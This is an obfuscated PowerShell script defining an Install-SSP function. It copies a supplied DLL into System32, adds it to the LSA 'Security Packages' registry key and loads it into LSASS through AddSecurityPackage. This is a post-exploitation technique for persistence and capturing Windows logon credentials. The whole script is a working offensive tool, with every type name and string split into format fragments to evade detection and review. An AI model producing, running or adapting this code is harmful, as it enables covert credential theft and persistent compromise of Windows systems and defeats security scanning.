$y9m  =  [type]("{8}{1}{6}{5}{4}{0}{3}{7}{2}"-f'wSIdE','RiTY.','ITY','N','O','PAl.wInD','PRiNCI','t','SEcU') ;   $UCqP =  [TYPE]("{2}{5}{1}{6}{3}{7}{4}{0}" -f'InROLe','UR','S','.PRInCipaL.wiNDOw','t','ec','ITY','sbuil') ;  SV  vdEG5W  ( [tYPE]("{3}{2}{1}{4}{0}{5}" -F 'FILEm','TeM.i','ys','s','o.','oDE') ) ;  $1OKHFz =[tYpE]("{3}{0}{2}{1}" -F 't','.FILeACCEss','Em.iO','SYs')  ;$9j3=  [tyPE]("{2}{1}{0}{4}{3}"-F 'SCi','T.A','sYSTEM.tEX','ENcOdInG','I')  ;$plZTk4 =  [type]("{2}{5}{0}{4}{3}{1}"-F'.SeEkoRI','N','Sy','i','g','StEm.IO') ;  sEt-ItEm VarIABle:UHmc0o  (  [tYpE]("{2}{3}{0}{1}"-f 'omA','In','aP','pD') )  ; set ("D"+"5F")  ( [TYpE]("{8}{0}{7}{9}{3}{2}{6}{5}{1}{4}" -F'n.','c','U','Lyb','ess','DERAC','iL','eMIt.AsSE','rEflecTIO','mB') )  ;  Set-ITeM vAriABLe:Ku87  ( [tyPe]("{2}{5}{4}{0}{1}{6}{3}"-f'Lli','Ng','REfle','NTioNs','N.CA','CTio','coNVE')  ) ;   sEt-itEm  vaRIaBLe:KvYz ([type]("{7}{6}{12}{0}{4}{1}{5}{10}{2}{8}{9}{3}{11}" -f 'T','RoPS','ces.','Io','E','ERV','T','run','CALLiNGCO','nVeNt','i','n','IME.In')  )  ;   sEt-VaRiabLe ('2'+'43') ([tYpE]("{5}{3}{7}{0}{2}{4}{8}{1}{6}"-F'.INT','es.ChaRSE','erO','unt','PServI','R','t','Ime','C') )  ;  set-variablE  ('pDZ'+'83') ([tyPE]("{0}{1}"-F 'iN','TPtr')  )  ;  $819 =[TYPe]("{0}{5}{1}{7}{4}{3}{6}{2}"-F 'run','Me','L','rOPsERV','e','TI','IceS.mArSHa','.int') ;function in`stalL-`sSP
{


    [CmdletBinding()] Param (
        [ValidateScript({.("{2}{1}{0}" -f '-Path','st','Te') (&("{1}{2}{0}" -f'th','Res','olve-Pa') ${_})})]
        [String]
        ${PA`TH}
    )

    ${pri`N`cIpAL} = [Security.Principal.WindowsPrincipal] $Y9m::("{2}{1}{0}"-f 'nt','re','GetCur').Invoke()

    if(-not ${PRiN`Ci`PaL}."IsINr`o`le"( $ucqp::"Ad`min`i`stRAtOr"))
    {
        throw ("{9}{17}{14}{1}{20}{5}{8}{4}{22}{11}{3}{18}{15}{13}{21}{10}{6}{7}{19}{16}{0}{2}{12}"-f 'promp','SSP dl','t','ve rights. E',' a','re','va','ted Power','s','I','e','rati','.',' script from','ling an ','this','hell ','nstal','xecute ','S','l requi',' an el','dminist')
    }

    
    ${f`uLlDL`LpAth} = .("{2}{1}{3}{0}" -f 'th','solve','Re','-Pa') ${Pa`Th}

    
    function LoC`AL:`g`E`T-peArc`hiTeC`TU`Re
    {
        Param
        (
            [Parameter( poSiTION = 0,
                        manDATOry = ${tr`UE} )]
            [String]
            ${P`ATh}
        )
    
        
        ${f`IL`ESTr`eAm} = .("{0}{2}{1}{3}" -f 'N','-Ob','ew','ject') ("{3}{0}{1}{2}{4}" -f 'e','m.IO.File','St','Syst','ream')(${p`ATh},  ( Ls VaRIAble:vDEg5w).VaLUe::"op`EN",   (  vArIaBLE ("1ok"+"h"+"fZ")  ).vALuE::"r`eAd")
    
        [Byte[]] ${mz`hE`ADeR} = &("{1}{0}{2}" -f 'w-O','Ne','bject') ("{0}{1}" -f 'Byte','[]')(2)
        ${f`i`Les`TREAm}.("{0}{1}"-f'R','ead').Invoke(${MzheA`d`ER},0,2) | .("{0}{2}{1}" -f 'Out','Null','-')
    
        ${Hea`DEr} =   (gET-chiLDiTEm ("VaRi"+"abLe:9J"+"3") ).vAlUE::"AsC`ii".("{0}{1}" -f'Ge','tString').Invoke(${Mz`h`eADEr})
        if (${h`eA`der} -ne 'MZ')
        {
            ${Filest`R`e`Am}.("{0}{1}" -f'Cl','ose').Invoke()
            Throw ("{0}{3}{5}{4}{1}{2}"-f 'I',' hea','der.','nv',' PE','alid')
        }
    
        
        ${fIL`EStrE`Am}."SE`EK"(0x3c,   (gI  variabLe:PLZTK4).vaLUe::"b`eGin") | .("{0}{2}{1}"-f'Ou','Null','t-')
    
        [Byte[]] ${l`Fan`Ew} = &("{2}{3}{1}{0}"-f'bject','-O','Ne','w') ("{0}{1}"-f'B','yte[]')(4)
    
        
        ${F`IlES`TrEAM}.("{1}{0}" -f'ead','R').Invoke(${L`Fa`NEw},0,4) | &("{0}{1}"-f'Out-Nul','l')
        ${PEoF`FsEt} = [Int] ('0x{0}' -f (( ${L`F`ANEw}[-1..-4] | .('%') { ${_}.("{0}{1}" -f'To','String').Invoke('X2') } ) -join ''))
    
        
        ${FILES`T`RE`Am}."sE`eK"(${pE`of`FseT} + 4,  (  get-vARiaBLE  ("Plz"+"tk4")).vaLue::"Beg`iN") | &("{0}{2}{1}" -f 'O','l','ut-Nul')
        [Byte[]] ${IM`AGE`_Fi`Le`_mAchiNe} = &("{1}{2}{0}" -f't','New-O','bjec') ("{1}{0}"-f'[]','Byte')(2)
    
        
        ${Fi`LesTR`e`AM}.("{1}{0}"-f 'ead','R').Invoke(${Im`A`ge_F`iLE_Mac`hine},0,2) | .("{1}{2}{0}" -f'-Null','O','ut')
        ${arcHITe`c`T`uRe} = '{0}' -f (( ${IMA`GE_fiLe_`m`AchinE}[-1..-2] | &('%') { ${_}.("{2}{0}{1}" -f'o','String','T').Invoke('X2') } ) -join '')
        ${filEsTr`E`Am}.("{0}{1}"-f 'Cl','ose').Invoke()
    
        if ((${arc`hiTECt`URE} -ne ("{1}{0}" -f '4C','01')) -and (${ArC`hIT`eCt`UrE} -ne ("{1}{0}" -f '4','866')))
        {
            Throw ("{1}{9}{5}{3}{6}{0}{11}{7}{4}{10}{8}{2}" -f 'upporte','Invalid PE','.',' un','tu','or','s',' architec','e',' header ','r','d')
        }
    
        if (${A`Rc`hiTe`C`TURE} -eq ("{1}{0}" -f'14C','0'))
        {
            &("{1}{2}{3}{0}"-f'put','Writ','e','-Out') ("{2}{1}{0}" -f 't','2-bi','3')
        }
        elseif (${aRcHI`TEc`Ture} -eq ("{0}{1}" -f'866','4'))
        {
            .("{0}{1}{2}" -f 'Wr','ite-Out','put') ("{1}{0}"-f '4-bit','6')
        }
        else
        {
            &("{2}{1}{0}" -f 't','Outpu','Write-') ("{1}{0}" -f 'r','Othe')
        }
    }

    ${dLl`ArchiTe`C`TuRE} = &("{1}{0}{3}{2}"-f't-P','Ge','hitecture','EArc') ${F`u`l`ldLLpATH}

    ${o`sar`ch} = &("{1}{0}{2}{3}"-f 'et-W','G','miObj','ect') ("{0}{2}{1}{3}{5}{4}" -f 'Wi','p','n32_O','erati','m','ngSyste') | .("{0}{2}{1}" -f 'Select','t','-Objec') -ExpandProperty ("{0}{1}{2}{4}{3}" -f'O','S','Arc','cture','hite')

    if (${DLl`ARC`hI`TECTUre} -ne ${Os`AR`cH})
    {
        throw ("{18}{14}{6}{20}{12}{1}{15}{21}{10}{13}{4}{8}{9}{5}{2}{17}{3}{11}{7}{16}{22}{0}{19}"-f'dl','era','m',' ','i','e must ',' ','tecture of','tect','ur','rc','archi','p','h','he','ting system ',' the S','atch the','T','l.','o','a','SP ')
    }

    ${d`Ll} = &("{0}{2}{1}" -f'Get-I','em','t') ${fUlld`ll`P`ATH} | .("{0}{2}{1}{3}"-f 'S','t-Objec','elec','t') -ExpandProperty ("{0}{1}"-f 'Na','me')

    
    
    ${D`Ll`NamE} = ${d`ll} | &('%') { &('%') {(${_} -split '\.')[0]} }

    
    ${S`e`cURityP`Ac`K`AgeS} = .("{2}{1}{3}{0}"-f'y','Item','Get-','Propert') (("{2}{8}{4}{13}{3}{9}{11}{14}{12}{10}{7}{0}{6}{1}{5}" -f'HCo','8HLs','HKL','STEM','38H','a','ntrol3','38','M:','38HCur','et','rentC','ntrolS','SY','o'))."REPL`ACe"(([chaR]51+[chaR]56+[chaR]72),'\') -Name ("{0}{2}{3}{1}"-f 'Secu','s','rity ','Package') |
        &("{2}{1}{3}{0}"-f't','t','Selec','-Objec') -ExpandProperty ("{2}{0}{1}{3}" -f 'rity',' Package','Secu','s')

    if (${S`e`CuRi`TYpackAgES} -contains ${DL`Ln`AmE})
    {
        throw ("'$DllName' "+'i'+'s '+'al'+'r'+'eady '+'present'+' '+'in'+' '+('HKLM:{0}SYS'+'TEM{0'+'}Cu'+'rrentCon'+'tr'+'olS'+'e'+'t{0'+'}Contro'+'l{'+'0'+'}'+'Lsa{0}'+'Secu'+'rity ')-f [char]92+'Pack'+'ag'+'es.')
    }

    
    ${NAT`IV`e`iNsTAlLdIR} = "$($Env:windir)\Sysnative"

    if (.("{0}{2}{1}" -f'Test-','ath','P') ${NAtIV`EIN`s`TalLd`IR})
    {
        ${I`NSTALl`dIR} = ${n`A`Ti`V`EIn`STALLdIr}
    }
    else
    {
        ${i`N`StALl`diR} = "$($Env:windir)\System32"
    }

    if (&("{0}{1}{2}" -f 'Tes','t-','Path') (&("{2}{1}{3}{0}" -f'h','in-','Jo','Pat') ${In`stalL`DIR} ${d`LL}))
    {
        throw ("$Dll "+'is'+' '+'alre'+'ady'+' '+'in'+'s'+'t'+'alled '+'in'+' '+"$InstallDir.")
    }

    
    .("{0}{2}{1}"-f 'Copy-','tem','I') ${F`UL`LdllpA`TH} ${i`Nsta`LLdIr}

    ${s`eCUrI`T`yPaCK`A`gEs} += ${DLL`Na`me}

    .("{0}{2}{1}{3}"-f'Set-It','mPr','e','operty') ((("{15}{11}{3}{7}{8}{10}{13}{4}{0}{5}{6}{12}{2}{1}{9}{14}"-f 'Con','rol','t','{','ent','t','rolSet{0}','0','}S','{0}L','YSTEM{0}C','LM:','Con','urr','sa','HK'))  -F  [ChAr]92) -Name ("{3}{0}{2}{1}{4}" -f 'cu','ty Package','ri','Se','s') -Value ${SEcURI`TY`P`Ackag`eS}

    ${D`YnasS`E`MbLY} = .("{2}{0}{1}{3}"-f'bj','e','New-O','ct') ("{2}{5}{1}{0}{4}{3}{7}{6}"-f 'n.Ass','o','Sys','blyN','em','tem.Reflecti','me','a')(("{1}{0}" -f 'PI2','SS'))
    ${As`sE`MbLYB`UiLdeR} =  $UHMc0o::"CU`RReN`T`Do`main"."d`EfI`NEdYnamIca`s`sEMbly"(${dYN`A`sSeMbly},  $D5F::"r`un")
    ${mo`Du`Le`Bu`ilDer} = ${asSe`MB`LYbu`iLD`ER}.("{2}{3}{0}{1}{4}" -f'M','odu','Defin','eDynamic','le').Invoke(("{0}{1}"-f'SS','PI2'), ${F`ALSe})

    ${T`yPebUI`L`der} = ${mO`DUlebUiL`deR}.("{0}{2}{1}" -f'Def','pe','ineTy').Invoke(("{1}{0}{2}"-f 'PI2.Sec','SS','ur32'), ("{2}{0}{1}" -f'blic, ','Class','Pu'))
    ${piN`VO`Kem`etHod} = ${TY`PEBuI`ldER}.("{2}{5}{4}{1}{3}{0}"-f'd','ok','Defin','eMetho','v','ePIn').Invoke(("{4}{2}{1}{3}{0}" -f 'age','ri','Secu','tyPack','Add'),
        ("{1}{2}{0}" -f 'dll','sec','ur32.'),
        ("{3}{1}{2}{0}" -f'c','Sta','ti','Public, '),
          $KU87::"s`TanDa`RD",
        [Int32],
        [Type[]] @([String], [IntPtr]),
         $kVYz::"WinA`pI",
          $243::"au`TO")

    ${SE`CuR`32} = ${ty`pEBu`iLD`er}.("{2}{1}{0}" -f 'pe','ateTy','Cre').Invoke()

    if (  (VaRiABle ('pDz'+'83')  ).vALue::"s`IzE" -eq 4) {
        ${StRuc`T`SIzE} = 20
    } else {
        ${s`TRu`cTSI`ZE} = 24
    }

    ${s`Tru`cTPTr} =   (Dir  ("V"+"a"+"RIAblE:81"+"9") ).vAlUE::("{1}{2}{0}" -f 'Global','A','llocH').Invoke(${sT`RuCt`Si`ZE})
      (GI  vaRIAbLe:819  ).VaLUe::("{1}{2}{0}"-f 'nt32','Wri','teI').Invoke(${s`T`RUcTpTR}, ${STruct`S`Ize})

    ${runTiME`Suc`CESS} = ${Tr`ue}

    try {
        ${res`Ult} = ${Se`cuR`32}::("{0}{2}{1}{3}"-f 'AddS','rityPack','ecu','age').Invoke(${Dl`Ln`AmE}, ${st`RUct`PTR})
    } catch {
        ${hRE`S`uLT} = ${ER`ROr}[0]."exC`epT`iON"."iNNER`ExceP`Ti`On"."hREs`U`lT"
        &("{2}{1}{0}{3}"-f'in','Warn','Write-','g') "Runtime loading of the SSP failed. (0x$($HResult.ToString('X8'))) "
        .("{4}{1}{3}{0}{2}"-f 'rni','W','ng','a','Write-') "Reason: $(([ComponentModel.Win32Exception] $HResult).Message) "
        ${ru`NTI`mesUccess} = ${f`AlsE}
    }

    if (${RuNtIMES`Ucc`ess}) {
        .("{1}{0}{3}{2}" -f'r','W','e-Verbose','it') ("{2}{3}{0}{6}{8}{1}{7}{5}{4}" -f 'll','oa','In','sta','mplete!','co','ation an','ding ','d l')
    } else {
        .("{1}{3}{0}{2}"-f 'e-Verbos','W','e','rit') ("{5}{1}{3}{9}{6}{7}{2}{0}{8}{4}"-f 'take eff','nstal','to ','l','.','I','n complete! Reboot for ','changes ','ect','atio')
    }
}